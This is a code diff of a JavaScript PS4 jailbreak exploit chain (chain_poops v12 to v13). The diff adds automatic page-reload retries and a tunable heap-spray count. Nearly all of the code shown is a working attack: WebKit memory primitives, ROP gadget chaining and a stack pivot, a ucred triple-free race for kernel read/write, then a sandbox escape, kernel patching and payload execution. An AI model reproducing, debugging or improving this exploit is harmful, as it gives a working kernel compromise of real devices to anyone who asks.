@@ -1,4 +1,4 @@
-// chain_poops_v12.js — NO cerrar el kqueue antes de probar candidatos
+// chain_poops_v13.js — auto-retry: si falla, recarga la pagina y reintenta
 import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
@@ -6,11 +6,15 @@ import { offsetsFor } from "./ps4_offsets.js";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
+const counterEl = document.getElementById("counter");
 const lines = [];
 let passCount = 0, failCount = 0;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
+// ============================================================
+// AJUSTES
+// ============================================================
 const CFG_IOV_WORKERS   = 1;
 const CFG_UIO_WORKERS   = 1;
 const CFG_ATTEMPTS      = 4;
@@ -23,6 +27,61 @@ const CFG_DO_JAILBREAK  = 1;
 const CFG_DO_KPATCH     = 1;
 const CFG_DO_PAYLOAD    = 1;
 const CFG_KARW_MAX_ATTEMPTS = 4;
+
+// Auto-retry
+const CFG_AUTO_RETRY     = 1;   // 1 = activado
+const CFG_AUTO_RETRY_MAX = 20;  // maximo de reintentos antes de parar
+const CFG_AUTO_RETRY_DELAY_MS = 1500;  // esperar antes de recargar
+// ============================================================
+
+// Contador persistente entre recargas
+function getRetryCount() {
+    try { return parseInt(sessionStorage.getItem("ps4lab_retry_count") || "0", 10); }
+    catch (e) { return 0; }
+}
+function setRetryCount(n) {
+    try { sessionStorage.setItem("ps4lab_retry_count", String(n)); }
+    catch (e) { }
+}
+function incRetryCount() {
+    const n = getRetryCount() + 1;
+    setRetryCount(n);
+    return n;
+}
+function resetRetryCount() {
+    try { sessionStorage.removeItem("ps4lab_retry_count"); } catch (e) { }
+}
+
+let autoRetryScheduled = false;
+function scheduleAutoRetry(reason) {
+    if (CFG_AUTO_RETRY !== 1 || autoRetryScheduled) return;
+    autoRetryScheduled = true;
+
+    const n = incRetryCount();
+    if (n > CFG_AUTO_RETRY_MAX) {
+        mark("AUTO-RETRY-STOP", "limite alcanzado: " + n + "/" + CFG_AUTO_RETRY_MAX);
+        state("limite de reintentos alcanzado", "bad");
+        return;
+    }
+
+    mark("AUTO-RETRY", "reason=" + reason + " next=" + n + "/" + CFG_AUTO_RETRY_MAX
+        + " wait=" + CFG_AUTO_RETRY_DELAY_MS + "ms");
+    state("auto-retry " + n + "/" + CFG_AUTO_RETRY_MAX + "...", "warn");
+
+    setTimeout(function () {
+        try {
+            // Limpiar el flag de "committed" para que el guard del boot no bloquee
+            localStorage.removeItem("ps4lab_committed_boot");
+        } catch (e) { }
+        try { location.reload(); } catch (e) { }
+    }, CFG_AUTO_RETRY_DELAY_MS);
+}
+
+// Al iniciar, mostrar el contador
+(function () {
+    const n = getRetryCount();
+    counterEl.textContent = "intentos: " + n + " (max " + CFG_AUTO_RETRY_MAX + ")";
+})();
 
 const TM = window.__TM = window.__TM || { startedAt: Date.now(), errors: [], stages: {}, diagnostics: {} };
 function tmStage(tag, detail) {
@@ -47,7 +106,7 @@ function post(tag, detail) {
         const x = new XMLHttpRequest();
         x.open("POST", "t", true);
         x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        x.send("PS4-S10&tag=" + encodeURIComponent(tag) + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
+        x.send("PS4-S13&tag=" + encodeURIComponent(tag) + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
     } catch (e) { }
 }
 const VERBOSE = CFG_VERBOSE === 1 || params.get("verbose") === "1";
@@ -81,7 +140,7 @@ function check(name, ok, detail) {
     try {
         if (window.__TM) {
             window.__TM.diagnostics[name] = ok ? 'PASS' : 'FAIL';
-            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v12.js', line: 0, col: 0, stack: '' });
+            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v13.js', line: 0, col: 0, stack: '' });
             if (window.__TM.render) window.__TM.render();
         }
     } catch (e) { }
@@ -146,16 +205,18 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
     try {
         const NUM_IOV_WORKER = CFG_IOV_WORKERS;
         const NUM_ATTEMPT = CFG_ATTEMPTS;
+        const NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x200;
         const MS_DELAY = CFG_MSDELAY;
 
         mark("SYS-TABLE", "entries=" + SYS_NAMES.length);
         const { key, off } = offsetsFor(navigator.userAgent);
         mark("FW", key || "(not a PS4 UA)");
-        if (!off) { state("no offsets", "bad"); return; }
+        if (!off) { state("no offsets", "bad"); scheduleAutoRetry("no-offsets"); return; }
         mark("FW-STATUS", off.fw_status || "none");
         mark("PLAN", "iov=" + NUM_IOV_WORKER + " uio=" + CFG_UIO_WORKERS
             + " attempts=" + NUM_ATTEMPT + " msdelay=" + MS_DELAY
-            + " karw_attempts=" + CFG_KARW_MAX_ATTEMPTS);
+            + " karw_attempts=" + CFG_KARW_MAX_ATTEMPTS
+            + " autoretry=" + CFG_AUTO_RETRY);
         tmDiag('fw_key', key);
 
         let kpatch = null, aiofix = null, payload = null;
@@ -210,7 +271,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         const libkernelBase = errorFn.sub32(off.k__error);
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
         const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
-        if (!check("module-bases-aligned", aligned(webkitBase) && aligned(libkernelBase), "")) return;
+        if (!check("module-bases-aligned", aligned(webkitBase) && aligned(libkernelBase), "")) { scheduleAutoRetry("bases"); return; }
 
         const G = {};
         const GAD = [
@@ -240,7 +301,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             }
             if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
         }
-        if (!check("gadget-table", gated === GAD.length, gated + "/" + GAD.length)) return;
+        if (!check("gadget-table", gated === GAD.length, gated + "/" + GAD.length)) { scheduleAutoRetry("gadgets"); return; }
         const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET, G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
 
         const stubAddr = new Map();
@@ -265,7 +326,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         }
         mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
         const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
-        if (!check("syscall-needs-stub", miss.length === 0, miss.join(","))) return;
+        if (!check("syscall-needs-stub", miss.length === 0, miss.join(","))) { scheduleAutoRetry("stubs"); return; }
 
         function bufAddr(ab) {
             const c = p.leakval(ab);
@@ -293,7 +354,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             c.stackU8.fill(0); c.frameU8.fill(0);
             const insts = [];
             for (let i = 0; i < args.length; ++i) {
-                if (!argGadget[i] || typeof argGadget[i].low !== "number") throw new Error("layout arg " + i);
+                if (!argGadget[i] || typeof argGadget[i].low !== "number") throw new Error("layout: arg[" + i + "]");
                 insts.push(argGadget[i]); insts.push(args[i]);
             }
             const targetIdx = insts.length;
@@ -315,15 +376,15 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
 
         let pivotCell = null;
         try { pivotCell = p.leakval(pivotObj); } catch (le) { mark("PIVOT-LEAKVAL-THREW", le.message); }
-        if (!pivotCell || typeof pivotCell.low !== "number") { state("primitiva inestable", "bad"); return; }
+        if (!pivotCell || typeof pivotCell.low !== "number") { scheduleAutoRetry("pivot-invalid"); return; }
         p.write8(mainMf, G.G0);
         mainArmed = true;
 
         function callAddr(target, args) {
-            if (!target || typeof target.low !== "number") throw new Error("callAddr bad target");
+            if (!target || typeof target.low !== "number") throw new Error("callAddr: bad target");
             layout(M, target, args);
             const saved = p.read8(pivotCell);
-            if (!saved || typeof saved.low !== "number") throw new Error("callAddr read8 pivot");
+            if (!saved || typeof saved.low !== "number") throw new Error("callAddr: read8");
             p.write8(pivotCell, M.S);
             Math.expm1(pivotObj);
             p.write8(pivotCell, saved);
@@ -331,9 +392,9 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         }
         sc = function (num) {
             const a = Array.prototype.slice.call(arguments, 1);
-            if (typeof num !== "number") throw new Error("sc num=" + num);
+            if (typeof num !== "number") throw new Error("sc: num=" + num);
             const stub = stubAddr.get(num);
-            if (!stub) throw new Error("sc no stub " + num);
+            if (!stub) throw new Error("sc: no stub " + num);
             return callAddr(stub, a);
         };
         function errno() {
@@ -406,16 +467,16 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         new Uint8Array(msgAb).fill(0); put(msgDv, 0x10, iovAddr); msgDv.setInt32(0x18, NUM_MSG_IOV, true);
 
         state("setting up...", "warn");
-        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("iov socketpair failed");
+        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) { scheduleAutoRetry("iov-ss"); return; }
         const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("uio socketpair failed");
+        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) { scheduleAutoRetry("uio-ss"); return; }
         const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
 
         mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(",") + " sin setsockopt");
 
-        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
+        if (sc(SYS.pipe, argAddr).i32 === -1) { scheduleAutoRetry("master-pipe"); return; }
         const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
+        if (sc(SYS.pipe, argAddr).i32 === -1) { scheduleAutoRetry("slave-pipe"); return; }
         const slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
         check("karw-pipe-pairs", masterPipe[0] > 0 && masterPipe[1] > 0 && slavePipe[0] > 0 && slavePipe[1] > 0, "m=" + masterPipe + " s=" + slavePipe);
 
@@ -475,10 +536,10 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 const arr = await w.rpc("init", 5000, sLo, sHi);
                 keepAlive.push(arr);
                 const D = bufAddr(arr.buffer);
-                if ((p.read4(D) >>> 0) !== sLo) throw new Error(name + " transfer failed");
+                if ((p.read4(D) >>> 0) !== sLo) throw new Error(name + ": transfer failed");
                 const storage = p.read8(D.add32(0x10));
                 const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
-                if (!mc || !ptrish(mc)) throw new Error(name + " walk failed");
+                if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
                 const bf = p.read8(mc.add32(8));
                 let wm = null, wv = null, wl = null;
                 for (let k = 1; k <= 8; ++k) {
@@ -490,7 +551,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
                     else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
                 }
-                if (!(wm && wv && wl)) throw new Error(name + " shapes not found");
+                if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
                 w.master = wm; w.origVector = p.read8(wm.add32(0x10));
                 p.write8(wm.add32(0x10), wv); w.wired = true;
                 await w.rpc("setup", 5000, wl.low, wl.hi);
@@ -506,7 +567,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             }
             await new Promise(r => setTimeout(r, 100));
         }
-        if (workers.length < 1) { state("TOO FEW WORKERS", "bad"); return; }
+        if (workers.length < 1) { scheduleAutoRetry("no-workers"); return; }
         const iovWorkers = workers.filter(w => w.name.startsWith("iov"));
         const uioWorkers = workers.filter(w => w.name.startsWith("uio"));
         mark("WORKER-POOLS", "iov=" + iovWorkers.length + " uio=" + uioWorkers.length);
@@ -533,19 +594,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             prioDv.setUint16(0, savedPrio[0], true); prioDv.setUint16(2, savedPrio[1], true);
             const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
             mark("THREAD-ATTRS-RESTORED", "at=" + why + " ar=" + ar + " pr=" + pr);
-            let wr = 0, wn = 0;
-            for (const w of workers) {
-                try {
-                    if (!w.armed) continue;
-                    wn++;
-                    new Uint8Array(maskAb).fill(0xff);
-                    await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 3000);
-                    prioDv.setUint16(0, RTP_PRIO_NORMAL, true); prioDv.setUint16(2, 0, true);
-                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 3000);
-                    wr++;
-                } catch (e) { }
-            }
-            mark("WORKER-ATTRS-RESTORED", wr + "/" + wn);
         }
         restoreCtx = { restore: restoreThreadAttrs };
         mark("THREAD-ATTRS-SAVED", "mask=" + savedMask + " rtprio={" + savedPrio + "}");
@@ -658,7 +706,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     return t;
                 }
                 const tasks = new Array(iovWorkers.length);
-                for (let i = 0; i < 0x200 && !reclaimed; ++i) {
+                for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
                     rounds = i + 1;
                     for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                     sc(SYS.sched_yield);
@@ -699,9 +747,9 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 continue;
             }
         }
-        check("ucred-triple-freed", !!triplets, triplets ? triplets.join(",") : "");
-        if (!triplets) { state("Sin triple free", "bad"); return; }
+        if (!check("ucred-triple-freed", !!triplets, triplets ? triplets.join(",") : "")) { scheduleAutoRetry("no-triplets"); return; }
 
+        // Utilidades kread/kwrite
         function fakeUio(uioIov, resid, rw) {
             new Uint8Array(iovAb).fill(0);
             put(iovDv, 0x00, uioIov);
@@ -784,7 +832,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         const kAligned = v => !!v && ((v.low >>> 0) & 7) === 0;
         function kaddrOk(v) { return isKptr(v) && kAligned(v); }
         const qw = (dv, o) => new int64(dv.getUint32(o, true), dv.getUint32(o + 4, true));
-        const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;
 
         async function kreadSlow(addr, size, pairs) {
             if (kreadPoisoned) return null;
@@ -858,7 +905,11 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             for (let t = 0; t < KREAD_TRIES; ++t) { const dv = await kreadSlow(null, total, pairs); if (dv) return dv; if (kreadPoisoned || !tripletsUsable()) break; }
             return null;
         }
+        const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;
 
+        // ============================================================
+        // MAKE_KARW con loop de reintentos
+        // ============================================================
         let kernelBase = null, kqFdp = null, kv = null, karwAttempt = 0;
 
         if (CFG_DO_MAKE_KARW === 1 && off.k_kl_lock && off.k_kl_lock !== 0) {
@@ -914,13 +965,8 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 }
                 mark("KARW-CANDIDATES", candidates.length + " candidatos");
 
-                // *** FIX v12: refindear triplets ANTES de probar (spray los movió) ***
                 triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
-                if (!triplets[2]) {
-                    mark("KARW-TRIPLET-LOST", "intento=" + karwAttempt);
-                    sc(SYS.close, kqFdLocal);
-                    break;
-                }
+                if (!triplets[2]) { mark("KARW-TRIPLET-LOST", "intento=" + karwAttempt); sc(SYS.close, kqFdLocal); break; }
 
                 let fdtOfiles = null, fdtOff = -1, consecutiveFails = 0;
                 for (const cand of candidates) {
@@ -933,14 +979,8 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     mark("KARW-FDT-ZERO", "off=0x" + cand.off.toString(16) + " val=" + v);
                 }
 
-                // *** FIX v12: cerrar el kqueue DESPUÉS de probar candidatos ***
                 sc(SYS.close, kqFdLocal);
-
-                // *** Y refindear triplets después del close ***
-                if (!refindPair("KC")) {
-                    mark("KARW-TRIPLETS-LOST-AFTER-CLOSE", "intento=" + karwAttempt);
-                    break;
-                }
+                if (!refindPair("KC")) { mark("KARW-TRIPLETS-LOST-AFTER-CLOSE", "intento=" + karwAttempt); break; }
 
                 if (!fdtOfiles) {
                     mark("KARW-FDT-FAILED", "intento=" + karwAttempt);
@@ -1036,10 +1076,11 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
 
         if (!kv) {
             mark("MAKE-KARW-ABORTED", "todos los intentos fallaron");
-            state("make_karw falló", "bad");
+            scheduleAutoRetry("make-karw-failed");
             return;
         }
 
+        // Jailbreak + kpatch + payload
         const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
         const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
         function kview(base) {
@@ -1051,7 +1092,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 setUint8: function (o, v) { new Uint8Array(kvwAb).fill(0); kvwDv.setUint8(0, v); kv.kwrite(base.add32(o), kvwAddr, 1); },
             };
         }
-        const fdtOfiles = await kread8(kqFdp);
+        const fdtOfiles2 = await kread8(kqFdp);
 
         let jailbroken = false, curproc = null;
         if (CFG_DO_JAILBREAK === 1) try {
@@ -1062,7 +1103,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
             const FD_RDIR = 0x10, FD_JDIR = 0x18;
             state("jailbreak...", "warn");
-            const fget = fd => kv.read8(fdtOfiles.add32(fd * FILEDESCENT_SIZE));
+            const fget = fd => kv.read8(fdtOfiles2.add32(fd * FILEDESCENT_SIZE));
             const kptr2 = v => v && (v.hi >>> 0) >= 0xffff0000;
             if (sc(SYS.pipe, argAddr).i32 !== -1) {
                 const escPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
@@ -1213,22 +1254,34 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         }
 
         mark("STEP10-CHAIN", "kv=up jb=" + jailbroken + " kp=" + kpatched + " af=" + aiofixRan + " pl=" + payloadRunning);
-        if (payloadRunning) { allDone = true; mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=1"); }
-        else if (kpatched) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=0");
-        else if (jailbroken) mark("SAFE-TO-EXIT", "karw=1 root=1");
-        else mark("SAFE-TO-EXIT", "karw=1 only");
+        if (payloadRunning) {
+            allDone = true;
+            mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=1");
+            resetRetryCount();  // Resetear contador en exito
+        } else if (kpatched) {
+            mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=0");
+            scheduleAutoRetry("kpatch-but-no-payload");
+        } else if (jailbroken) {
+            mark("SAFE-TO-EXIT", "karw=1 root=1");
+            scheduleAutoRetry("jailbreak-but-no-kpatch");
+        } else {
+            mark("SAFE-TO-EXIT", "karw=1 only");
+            scheduleAutoRetry("karw-only");
+        }
 
         mark("STEP10-SUMMARY-FINAL", "karw_attempts=" + karwAttempt
             + " kernel_base=" + (kernelBase || "none")
-            + " kv=" + (kv ? "up" : "down"));
+            + " kv=" + (kv ? "up" : "down")
+            + " retry_count=" + getRetryCount());
 
         state(allDone ? "BERHASIL -- Tekan tombol PS"
-              : kv ? "KERNEL R/W OK"
-              : "make_karw falló",
+              : kv ? "KERNEL R/W OK -- auto-retry"
+              : "make_karw falló -- auto-retry",
               allDone ? "ok" : kv ? "warn" : "bad");
     } catch (e) {
         mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
-        state("FAILED", "bad");
+        state("FAILED -- auto-retry", "bad");
+        scheduleAutoRetry("exception");
     } finally {
         if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
         try {
@@ -1254,6 +1307,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         for (const w of workers) { try { w.worker.terminate(); } catch (e) { } }
         try { if (mainArmed && mainMf && mainOrig && p) { p.write8(mainMf, mainOrig); mainArmed = false; mark("EXPM1-RESTORED", "" + Math.expm1(1)); } } catch (e) { }
 
-        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
+        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount
+            + " retry=" + getRetryCount());
     }
 })();
